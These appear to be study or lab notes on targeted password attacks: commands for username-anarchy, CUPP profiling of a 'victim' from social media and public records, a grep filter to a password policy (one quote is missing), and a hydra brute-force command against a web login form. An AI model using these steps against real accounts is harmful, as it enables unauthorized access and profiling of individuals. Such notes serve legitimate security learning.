```shell-session
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```

```shell-session
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## CUPP
Common User Passwords Profiler
Gather information from:
- Social Media
- Company Websites
- Public Records
- New Articles and Blogs

```shell-session
sudo apt install cupp -y
cupp -i
```
- Input in information about the victim

Scenario:
- Minimum 6 characters
- At least on uppercase letter
- At least one lowercase letter
- At least one number
- At least two special characters (from the set !@#$%^&*)
```shell-session
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E ([!@#$%^&*].*){2,}' > jane-filtered.txt
```
```shell-session
hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/username=^USER^&password=^PASS^:Invalid credentials"
```
